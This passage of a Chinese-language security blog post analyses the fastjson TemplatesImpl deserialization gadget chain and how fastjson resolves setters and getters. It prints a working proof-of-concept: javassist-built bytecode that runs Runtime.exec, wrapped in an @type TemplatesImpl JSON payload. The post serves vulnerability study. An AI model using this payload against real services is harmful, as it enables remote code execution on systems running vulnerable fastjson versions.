class="line">    propertyName = methodName.substring(<span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (c3 == <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">    propertyName = methodName.substring(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//如果不是以上情况，就判断方法名长度是否大于5并且方法名的第五个字符是否是大写</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.length() &gt;= <span class="number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">4</span>))) &#123;</span><br><span class="line">    propertyName = TypeUtils.decapitalize(methodName.substring(<span class="number">3</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面的筛选获取截选后的字段的属性值，如果属性值不存在或者类型为boolean类型，就对其变量名前面加上is拼接，再查询拼接后的字段的属性值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> TypeUtils.getField(clazz, propertyName, declaredFields);</span><br><span class="line"><span class="keyword">if</span> (field == <span class="literal">null</span> &amp;&amp; types[<span class="number">0</span>] == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">isFieldName</span> <span class="operator">=</span> <span class="string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="number">0</span>)) + propertyName.substring(<span class="number">1</span>);</span><br><span class="line">    field = TypeUtils.getField(clazz, isFieldName, declaredFields);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后将符合条件的添加入fieildList中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,</span><br><span class="line">                                         annotation, fieldAnnotation, <span class="literal">null</span>));</span><br></pre></td></tr></table></figure><p>总结必须满足的条件就是：</p><ul><li>方法名长度不能小于4</li><li>方法不能是静态方法</li><li>方法的返回类型必须是void类型或者返回方法本身</li><li>方法的参数个数必须为1个</li><li>方法名开头必须是set开头</li></ul><h4 id="getter构建"><a href="#getter构建" class="headerlink" title="getter构建"></a>getter构建</h4><p><img src="/posts/ad3be047/fj1-13.png" title="getter构建"></p><p>流程差不多<br>条件判断，方法名长度不能小于4</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法不能是静态方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>条件判断，方法名必须以”get”开头，并且方法名的第四个字母必须是大写</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>))) &#123;</span><br><span class="line">    <span class="keyword">if</span> (method.getParameterTypes().length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>条件判断，方法的返回类型必须继承（Collection、Map、AtomicBoolean、AtomicLong）四个类的其中一种</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">        || Map.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">        || AtomicBoolean.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">        || AtomicInteger.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">        || AtomicLong.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">    ) &#123;</span><br></pre></td></tr></table></figure><p>然后把满足条件的放进fieldinfo中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="literal">null</span>, <span class="literal">null</span>));</span><br></pre></td></tr></table></figure><p>接着获取方法的是否存在JSONField的注解方法，类似下图，判断该类是否存在JSONField的注解方法，并且是否可以反序列化，反序列化设置默认为true<br><img src="/posts/ad3be047/fj1-15.png" title="beaninfo"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JSONField</span> <span class="variable">annotation</span> <span class="operator">=</span> method.getAnnotation(JSONField.class);</span><br><span class="line">    <span class="keyword">if</span> (annotation != <span class="literal">null</span> &amp;&amp; annotation.deserialize()) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (annotation != <span class="literal">null</span> &amp;&amp; annotation.name().length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        propertyName = annotation.name();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        propertyName = Character.toLowerCase(methodName.charAt(<span class="number">3</span>)) + methodName.substring(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后获取字段信息，查看该注释方法名在fieildList中否存在</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> getField(fieldList, propertyName);</span><br><span class="line">    <span class="keyword">if</span> (fieldInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (propertyNamingStrategy != <span class="literal">null</span>) &#123;</span><br><span class="line">        propertyName = propertyNamingStrategy.translate(propertyName);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>满足上面条件就将信息存进fieildList中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="literal">null</span>, <span class="literal">null</span>));</span><br></pre></td></tr></table></figure><p>总结必须满足的条件就是：</p><ul><li>方法名长度不能小于4</li><li>方法不能是静态方法</li><li>方法名开头必须是get开头</li><li>方法的返回类型必须继承（Collection、Map、AtomicBoolean、AtomicLong）四个类的其中一种</li></ul><p>最后通过返回javaBeanInfo将上面的fieldinfo一起放进beaninfo中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaBeanInfo</span>(clazz, builderClass, defaultConstructor, <span class="literal">null</span>, <span class="literal">null</span>, buildMethod, jsonType, fieldList);</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/fj1-14.png" title="beaninfo"></p><h1 id="0x03、TemplatesImpl知识回顾"><a href="#0x03、TemplatesImpl知识回顾" class="headerlink" title="0x03、TemplatesImpl知识回顾"></a>0x03、TemplatesImpl知识回顾</h1><p>TemplatesImpl在cc2链学习中涉及到，这里直接引用cc2分析的部分吧</p><h2 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h2><p>ClassLoader为类加载器，可以将字节码文件(.class文件)，通过loadClass函数加载类名，返回一个Class对象，同时ClassLoader类下面存在defineClass方法，可以将byte[]字节数组信息还原成一个Class对象，在学javassist中，了解到javassist可以动态生成字节码文件，包括了一些恶意代码文件，可进而通过ClassLoader类加载器将这些恶意的字节码文件转化为java类进行调用，达到执行恶意代码的目的</p><p>其中类加载阶段：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ClassLoader#loadClass（类加载，从类缓或父加载器等位置寻找类）</span><br><span class="line">    ——&gt; ClassLoader#findClass（寻找类，通过URL制定的方式加载字节码）</span><br><span class="line">        ——&gt; ClassLoader#defineClass（定义类，通过获取的字节码转换成类对象）</span><br></pre></td></tr></table></figure><p>由于ClassLoader#defineClass方法为protect修饰，因此可通过反射进行调用</p><p>简单实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//ct.writeFile(&quot;./&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//生成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] bt=ct.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用ClassLoader#defineClass</span></span><br><span class="line">        Method define=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class ,<span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        define.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Class cla=(Class)define.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;People2&quot;</span>,bt,<span class="number">0</span>,bt.length);</span><br><span class="line">        cla.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/cc2-25.png" title="defineClass实现"></p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>TemplatesImpl这个类简述功能就是对xsl格式文件生成的字节码转换成XSLTC模板对象，期间会处理字节码，因此重写了defineClass方法，具体描述可查看<a href="https://www.anquanke.com/post/id/247044">TemplatesImpl了解</a></p><p><img src="/posts/ad3be047/cc2-26.png" title="重写defineClass"></p><p>重写了<code>defineClass</code>方法，并且没有定义域，可以在其他类进行调用使用，而<code>ClassLoader#defineClass</code>定义域是受保护的，在很多情况中调用受限，因此这也是<code>TransletClassLoader#defineClass</code>作为很多序列化漏洞入口，而不是使用<code>ClassLoader#defineClass</code></p><p>但该<code>defineClass()</code>的调用并不会实例化，需要通过<code>newInstance()</code>进行实例化。</p><p>依次看调用情况</p><h3 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses()"></a>defineTransletClasses()</h3><p><code>defineClass</code>在<code>defineTransletClasses</code>方法中被调用</p><p><img src="/posts/ad3be047/cc2-27.png" title="defineClass调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_bytecodes</code>不能为空，为空会直接抛出异常</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_tfactory</code>需要实例化<br>创建的<code>TransletClassLoader</code>(Translet类的加载器)对象，其中<code>_tfactory.getExternalExtensionsMap()</code>中的<code>_tfactory</code>对象为<code>TransformerFactoryImpl</code>类对象，等同于调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法，但其中<code>_tfactory</code>对象初始赋值为null，直接执行会报错，因此需要将<code>_tfactory</code>进行实例化，才能调用<code>TransformerFactoryImpl.getExternalExtensionsMap()</code>方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">           AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">               <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;);</span><br></pre></td></tr></table></figure><p>两种实现方法都可以实例化，第一种通过<code>TransformerFactoryImpl()</code>构造方法实现实例化对象，第二种通过反射直接实现实例化对象。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br></pre></td></tr></table></figure></li><li><p><code>父类需要为ABSTRACT_TRANSLET</code>类<br>通过for循环对字节文件类进行循环定义并赋值给class数组，其中会判断当前获取的字节类的父类是否为<code>ABSTRACT_TRANSLET</code>类，是的话会讲该类序号赋值给<code>_transletIndex</code>，否则不是的话会抛出异常（表意为只有存在父类为<code>ABSTRACT_TRANSLET</code>类的<code>translet</code>类才能被实例化），从而在<code>getTransletInstance</code>类中的<code>AbstractTranslet</code>实例化步骤将父类为<code>ABSTRACT_TRANSLET</code>的类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">               _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">               <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">               <span class="comment">// Check if this is the main class</span></span><br><span class="line">               <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                   _transletIndex = i;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>_bytecodes</code>字节码需要设置为byte[][]数组，<code>_bytecodes</code>变量声明为byte[][]类型，如果直接通过javassist toBytecode()生成byte[]数组运行会报错。<br><img src="/posts/ad3be047/cc2-33.png" title="_bytecodes数组"><br><img src="/posts/ad3be047/cc2-34.png" title="_bytecodes数组"><br>因此需要将一维数组转化为二维数组。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line"><span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br></pre></td></tr></table></figure></li></ol><p>接着查看<code>defineTransletClasses</code>方法的上层调用情况<br>其中有三处对该方法进行了调用，其中只用<code>getTransletInstance</code>方法有上层调用，其他两个方法没有被其他方法进行调用。</p><p><img src="/posts/ad3be047/cc2-28.png" title="getTransletInstance调用"></p><h3 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance()"></a>getTransletInstance()</h3><p><img src="/posts/ad3be047/cc2-29.png" title="getTransletInstance调用"></p><p>其中需要的满足条件：</p><ol><li><p><code>_name</code>不能为空，为空会直接返回<code>null</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>_class</code>必须为空，才能调用<code>defineTransletClasses</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br></pre></td></tr></table></figure></li></ol><p>最后通过创建<code>AbstractTranslet</code>对象将class文件类进行实例化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure><p>接着查看<code>getTransletInstance</code>方法的上层调用情况</p><p><img src="/posts/ad3be047/cc2-30.png" title="getTransletInstance调用"></p><p><code>newTransformer()</code>方法进行了调用</p><h3 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h3><p>在调用构造函数的时候调用了<code>getTransletInstance</code>方法，返回Translet类的实例，其中没有需要的满足条件。</p><p>接着查看<code>newTransformer()</code>方法的上层调用情况</p><p><img src="/posts/ad3be047/cc2-31.png" title="newTransformer调用"></p><p>其中有5处显示进行了调用，但只有<code>getOutputProperties</code>方法调用的本类的<code>newTransformer()</code>方法，其他四种都是调用的其他类重写的<code>newTransformer()</code>方法。</p><h3 id="getOutputProperties"><a href="#getOutputProperties" class="headerlink" title="getOutputProperties()"></a>getOutputProperties()</h3><p><img src="/posts/ad3be047/cc2-32.png" title="getOutputProperties调用"></p><p>该方法直接执行了<code>newTransforme</code>方法，没有其他条件限制，查询<code>getOutputProperties</code>的上层调用，没有在本类发现其调用，因此最后的执行方法就在<code>getOutputProperties</code></p><h3 id="完整链"><a href="#完整链" class="headerlink" title="完整链"></a>完整链</h3><p>到<code>newTransformer</code>方法执行就能达到触发了，他上层<code>getOutputProperties</code>方法也进行了调用，也可以算进去当作延伸出来的链。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getOutputProperties()</span><br><span class="line">    newTransformer()</span><br><span class="line">        getTransletInstance()</span><br><span class="line">            defineTransletClasses()</span><br><span class="line">                defineClass()</span><br></pre></td></tr></table></figure><h3 id="实现demo"><a href="#实现demo" class="headerlink" title="实现demo"></a>实现demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct=pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode=ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes=<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化，效果等同于new TransformerFactoryImpl()</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.newInstance());</span><br><span class="line">        <span class="comment">//执行newTransformer()方法</span></span><br><span class="line">        templates.newTransformer();</span><br><span class="line">        <span class="comment">//执行getOutputProperties(),getOutputProperties为newTransformer上层调用，执行效果相同，就是多了个执行步骤</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be047/cc2-35.png" title="实现demo"></p><h1 id="0x04、fastjson-TemplatesImpl利用分析"><a href="#0x04、fastjson-TemplatesImpl利用分析" class="headerlink" title="0x04、fastjson-TemplatesImpl利用分析"></a>0x04、fastjson-TemplatesImpl利用分析</h1><p>只有正向分析了解执行过程了，逆向分析思路实在难理</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>参考网上的POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateEvil</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clas</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        clas.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//clas.writeFile(&quot;./&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = clas.toBytecode();</span><br><span class="line">        <span class="type">String</span> <span class="variable">EvilCode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        <span class="comment">//System.out.println(EvilCode);</span></span><br><span class="line">        <span class="keyword">return</span> EvilCode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">GADGAT_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">evil</span> <span class="operator">=</span> Payload.generateEvil();</span><br><span class="line">        <span class="type">String</span> <span class="variable">PoC</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + GADGAT_CLASS + <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evil + <span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span>+<span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line">        JSON.parseObject(PoC,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前半段就是<code>javassist</code>字节码生成恶意代码，在上面<code>ClassLoader</code>和<code>TemplatesImpl</code>分析的时候提过了，区别就是生成的恶意字节码经过<code>Base64</code>编码过一次，为什么会经过<code>Base64</code>编码，分析过程去了解。</p><p>下半段主程序就是<code>fastjson</code>反序列化<code>TemplatesImpl</code>类，加载恶意字节码，同时添加<code>TemplatesImpl</code>执行需要满足的几个条件属性，最后添加<code>_outputProperties</code>字段目的经过转换调用<code>getoutputProperties()</code>方法执行恶意代码，后面又加了一个<code>_name</code>参数和<code>allowedProtocols</code>参数。</p><p>最后在<code>parseObject</code>反序列化的时候添加了<code>Feature.SupportNonPublicField</code>参数，突破访问私有属性限制，因为<code>TemplatesImpl</code>类大部分属性都是<code>private</code>保护属性，fastjson默认无法序列化保护属性的变量。</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>调试首先进入对应参数类型的<code>parseObject</code>方法<br><img src="/posts/ad3be047/fj1-16.png" title="parseObject方法"></p><p>判断input输入是否为空，然后创建默认<code>JSONparser</code>解析器<br><img src="/posts/ad3be047/fj1-17.png" title="JSONparser"></p><p>跟进<code>DefaultJSONParser</code>方法，先通过分词器(laxer,用于对input值进行符号分割，获取对应的截选字段)获取开头字符是否是”{“</p><p><img src="/posts/ad3be047/fj1-18.png" title="JSONparser"></p><p>是的话，就设置<code>token</code>为<code>JSONtoken.LBRACE</code>，值为12</p><p><img src="/posts/ad3be047/fj1-19.png" title="token"></p><p>然后对解析器<code>parser</code>进行<code>parseObject</code>序列化操作，<code>Type</code>对象为输入的<code>Object.class</code>对象</p><p><img src="/posts/ad3be047/fj1-20.png" title="parseObject"></p><p>跟进<code>parseObject</code>方法，判断<code>token</code>所属类型，然后获取反序列化解析器</p><p><img src="/posts/ad3be047/fj1-21.png" title="parseObject"><br><img src="/posts/ad3be047/fj1-22.png" title="getDeserializer"></p><p>跟进<code>getDeserializer</code>方法，根据Type（即输入的<code>Object.class</code>对象）获取对应的反序列化器，获取的反序列化器为<code>JavaObjectDeserializer</code></p><p><img src="/posts/ad3be047/fj1-23.png" title="getDeserializer"><br><img src="/posts/ad3be047/fj1-24.png" title="getDeserializer"></p><p>获取反序列化器后，判断对象类型后，对反序列化器进行反序列化操作。</p><p><img src="/posts/ad3be047/fj1-25.png" title="parse"></p><p>跟进<code>parse</code>方法</p><p><img src="/posts/ad3be047/fj1-26.png" title="parse"></p><p>通过<code>Token</code>判断后进入判断体分支，创建新的<code>json</code>对象，然后对该<code>json</code>对象和<code>fieldName</code>字段（当前类对象为Object，没有解析字段，所以值为null）进行反序列化解析</p><p><img src="/posts/ad3be047/fj1-27.png" title="parse"></p><p>再次跟进<code>parseObject</code>方法</p><p>前面的一大段操作都是通过分词器<code>laxer</code>获取的字符进行判断是否合法</p><p><img src="/posts/ad3be047/fj1-28.png" title="input合法判断"></p><p>一直到key值的判断，key为获取的<code>@type</code>，typeName为<code>@type</code>的值即输入的<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p><p><img src="/posts/ad3be047/fj1-29.png" title="key判断"></p><p>通过加载类获取一个<code>TemplatesImpl</code>类对象<code>clazz</code></p><p><img src="/posts/ad3be047/fj1-30.png" title="获取TemplatesImpl类对象"></p><p>获取<code>TemplatesImpl</code>类对象后，再次寻找对应的反序列化器</p><p><img src="/posts/ad3be047/fj1-31.png" title="获取TemplatesImpl类对象"></p><p>由于<code>TemplatesImpl</code>类并不在<code>derializers</code>的列表中，因此<code>derializer</code>为<code>null</code>，<code>derializer</code>列表大部分为<code>hashmap</code></p><p><img src="/posts/ad3be047/fj1-32.png" title="derializer为null"></p><p>但<code>type(TemplatesImpl)</code>属于<code>Class</code>，因此进入另一个获取反序列化器的方法<code>getDeserializer((Class&lt;?&gt;) type, type)</code>，继续跟进<code>getDeserializer</code>方法<br>前半段依旧是获取<code>type</code>的反序列化器，同样<code>derializer</code>还是为<code>null</code></p><p><img src="/posts/ad3be047/fj1-33.png" title="getDeserializer"></p><p>不同上一个获取反序列化器的方法，接下来获取clazz的类名即（com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl），然后判断该类名是否是黑名单（java.lang.Thread）中的内容</p><p><img src="/posts/ad3be047/fj1-34.png" 